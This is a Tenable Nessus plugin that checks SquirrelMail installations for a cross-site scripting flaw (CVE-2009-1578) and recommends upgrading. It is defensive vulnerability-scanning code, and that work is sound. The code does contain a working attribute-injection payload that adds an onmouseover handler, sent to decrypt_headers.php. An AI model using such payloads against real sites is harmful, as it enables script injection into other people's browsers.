#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(38793);
  script_version("$Revision: 1.4 $");
  
  script_cve_id("CVE-2009-1578");
  script_bugtraq_id(34916);
  script_xref(name:"OSVDB", value:"54504");

  script_name(english:"SquirrelMail < 1.4.18 Multiple XSS");
  script_summary(english:"Checks for an XSS vulnerability in SquirrelMail");

  script_set_attribute(attribute:"synopsis", value:
"The remote webmail application is affected by a cross-site scripting
vulnerability."
);
  script_set_attribute(attribute:"description", value:
"The installed version of SquirrelMail fails to sanitize user-supplied
input to the 'PHP_SELF' and 'QUERY_STRING' server environment
variables.  An unauthenticated attacker can exploit this issue to
launch cross-site scripting attacks against the affected application. 

There are also reportedly several other issues, including cross-site
scripting vulnerabilities, a code injection vulnerability, and a
session fixation vulnerability, though Nessus has not tested for
these.");
 
  script_set_attribute(attribute:"see_also", value:"http://www.squirrelmail.org/security/issue/2009-05-08" );
  script_set_attribute(attribute:"solution", value:
"Upgrade to SquirrelMail 1.4.18 or later." );
  script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N" );

  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("squirrelmail_detect.nasl", "cross_site_scripting.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);
if (get_kb_item("www/"+port+"/generic_xss")) exit(0);

now=unixtime();
exploit = string('"onmouseover="alert(', "'Nessus",now,"'",')">');

# Test an install
install = get_kb_item(string("www/", port, "/squirrelmail"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)){
  url = string(matches[2], "/contrib/decrypt_headers.php/", exploit);
  res = http_send_recv3(port:port, method:"GET", item:url);
  if (isnull(res)) exit(0);
  # There's a problem if we see our exploit in the result
  if (
    (
      "Secret key:" >< res[2] &&
      "Encrypted string:" >< res[2] &&
      exploit >< res[2]
    )
  )
  {
    set_kb_item(name: 'www/'+port+'/XSS', value:TRUE);

    if (report_verbosity > 0)
    {
      report = string(
        "\n",
        "Nessus was able to exploit the issue with the following URL :\n",
        "\n",
        "  ", build_url(port:port, qs:url),
        "\n"
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    exit(0);
  }
}
